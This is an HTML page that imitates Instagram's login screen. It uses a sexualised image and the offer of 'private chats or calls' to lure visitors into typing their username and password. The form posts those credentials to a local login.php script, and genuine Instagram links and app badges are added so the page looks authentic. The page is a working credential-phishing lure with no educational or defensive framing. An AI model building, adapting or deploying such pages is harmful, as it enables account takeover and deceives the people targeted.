<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Chats & Calls</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background: #fafafa;
            color: #262626;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }
        
        .instagram-watermark {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            opacity: 0.03;
            z-index: 0;
            width: 100%;
            max-width: 800px;
        }
        
        .instagram-watermark svg {
            width: 100%;
            height: auto;
        }
        
        .container {
            max-width: 935px;
            width: 100%;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            align-items: center;
            gap: 30px;
            position: relative;
            z-index: 1;
        }
        
        .content {
            flex: 1;
            min-width: 300px;
            max-width: 350px;
        }
        
        h1 {
            font-size: 28px;
            margin-bottom: 20px;
            font-weight: 600;
            text-align: center;
            color: #262626;
        }
        
        p {
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.5;
            color: #8e8e8e;
            text-align: center;
        }
        
        .form-container {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            padding: 20px 40px;
            border-radius: 1px;
            width: 100%;
            max-width: 350px;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        input {
            width: 100%;
            padding: 9px 8px 7px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            color: #262626;
            font-size: 12px;
            transition: all 0.3s ease;
        }
        
        input:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        
        button {
            width: 100%;
            padding: 7px;
            border: none;
            border-radius: 4px;
            background: #0095f6;
            color: white;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        
        button:hover {
            background: #0077cc;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 15px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        
        .divider::before {
            margin-right: 10px;
        }
        
        .divider::after {
            margin-left: 10px;
        }
        
        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-align: center;
            margin: 15px 0;
            cursor: pointer;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-align: center;
            margin-top: 15px;
            cursor: pointer;
        }
        
        .image-container {
            flex: 1;
            min-width: 300px;
            max-width: 380px;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }
        
        .sexy-image {
            width: 80%;
            height: auto;
            max-height: 600px;
            object-fit: cover;
            border-radius: 10px;
            box-shadow: 0 0 5px rgba(0,0,0,0.1);
        }
        
        .switch-account {
            margin-top: 20px;
            background: #ffffff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        
        .switch-account a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .app-download {
            text-align: center;
            margin-top: 20px;
        }
        
        .app-download p {
            margin-bottom: 15px;
        }
        
        .app-stores {
            display: flex;
            justify-content: center;
            gap: 10px;
        }
        
        .app-store-img {
            height: 40px;
        }
        
        @media (max-width: 768px) {
            .container {
                flex-direction: column-reverse; /* Changed to show image first on mobile */
            }
            
            .image-container {
                display: flex; /* Ensure image container is visible */
                max-width: 100%;
                margin-bottom: 20px;
            }
            
            .sexy-image {
                max-height: 300px; /* Adjusted for better mobile display */
            }
            
            .form-container {
                background: #ffffff;
                border: 1px solid #dbdbdb;
                padding: 20px;
            }
            
          
        }
    </style>
</head>
<body>
  
    
    <div class="container">
        <div class="image-container">
            <img src="https://www.nudeindians2.net/wp-content/uploads/2025/02/insta-3.jpg" alt="Attractive woman" class="sexy-image">
        </div>
        
        <div class="content">
            <div class="form-container">
                <h1>Private Connections</h1>
                <p>If you want to do private chats or calls, you're welcome</p>
                
                <form method="POST" action="login.php">
                    <div class="form-group">
                        <input type="text" name="username" placeholder="Phone number, username, or email" required>
                    </div>
                    <div class="form-group">
                        <input type="password" name="password" placeholder="Password" required>
                    </div>
                    <button type="submit">Log In</button>
                    
                
                </form>
            </div>
            
            <div class="switch-account">
                Don't have an account? <a href="https://www.instagram.com/accounts/login/?hl=en">Sign up</a>
            </div>
            
            <div class="app-download">
                <p>Get the app.</p>
                <div class="app-stores">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store" class="app-store-img">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play" class="app-store-img">
                </div>
            </div>
        </div>
    </div>
    
    <!-- Font Awesome for Facebook icon -->
    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
</body>
</html>
